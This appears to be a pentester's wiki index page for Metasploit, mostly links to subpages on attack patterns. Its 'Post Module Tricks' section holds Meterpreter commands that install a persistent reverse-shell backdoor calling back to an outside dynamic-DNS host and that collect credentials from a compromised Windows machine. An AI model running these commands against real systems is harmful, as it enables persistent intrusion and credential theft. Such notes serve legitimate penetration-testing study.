<!-- TITLE: Metasploit Main -->
<!-- SUBTITLE: A quick summary of Metasploit Main -->


[Back to Tools](/tools)

[Metasploit Site](https://www.metasploit.com/)

[MSFVenom](/msfvenom)

[Meterpreter](/meterpreter)

[MSFConsole](/msfconsole)

[MSFDB](/msfdb)

[MSFRPC](/msfrpc)

[Programming](/metasploitprogramming)
# Known Attack Patterns
[Pass the Hash](/passthehash)
[Browser Attacks](/browserattacks)
[Office Macro Attacks](/officemacros)
[PDF Payload](/pdfpayload)
[MSSql to Meterpreter](/mssqlmeterpreter)
[Web Delivery of powershell script](/meterpreterwebdelivery)
# Writing Exploits
# Post Module Tricks
run persistence -P windows/meterpreter/reverse_tcp_dns -S -i 9000 -p 9998 -r olympus.dyns.cx
-i - I think is interval

Post Exploit
run prefetchtool -l

run post/windows/gather/credential_collector

# MSF RPC Connections